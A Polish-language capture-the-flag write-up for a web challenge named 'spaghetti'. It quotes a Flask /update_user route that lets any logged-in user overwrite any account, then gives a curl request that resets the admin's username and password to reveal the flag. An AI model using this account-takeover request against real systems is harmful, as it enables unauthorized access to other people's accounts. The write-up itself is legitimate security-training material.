# spaghetti
![](cc6c252c8521d8bc09cb8a0c88ef5bb6)

Jak opis mówi należy dostać do notatek admina, aby uzyskać flagę.
Potwierdzenie znajduje się w pliku "init.sql"
```
INSERT INTO users (username, password_hash) VALUES ('admin', '61adb00353ee34dfecf60baf39678aedfc730cfbd5128f64b21abd34c8ce6e63');
INSERT INTO notes (user_id, content) VALUES (1, 'WSIZ{fake_flag_for_testing}')
```

Po utworzeniu własnej instacji, zarejestrowaniu oraz zalogowaniu się, czas przeanalizować kod "main.py".
Błąd zostaje znaleziony w tym fragmencie:
```
@app.route('/update_user', methods=['POST'])
def update_user():
    if 'user_id' not in session:
        return jsonify({'message': 'Unauthorized'}), 401

    data = request.get_json()
    user = User(**data)
    res = user.save()
```

Kod nie sprawdza, kto wysyła zapytanie, umożliwiając dowolnemu zalogowanemu użytkownikowi zmienić nazwę użytkownikowi i hasło dowolnego zarejestrowanego użytkownika.

Po wykonaniu `curl 'http://challenges.wsi.edu.pl:6049/update_user' -X POST -H 'Cookie: instance_id=429ce18f7c9aaf3e2b44bd61a0090ff8; session=eyJ1c2VyX2lkIjoyfQ.ZXMXDg.1qUdPujY02Dnfiq4ff7s53W51RY' -H 'Content-Type: application/json' --data-raw '{"id": 1, "username": "b", "password": "b"}'` uzyskujemy odpowiedź `{ "message": "User updated successfully" }`.
Po zalogowaniu się na podane dane w zapytaniu, wyświetla się flaga będącą notatką admina.

Flaga: `WSIZ{th3_fix3d_sp4gh3tti}`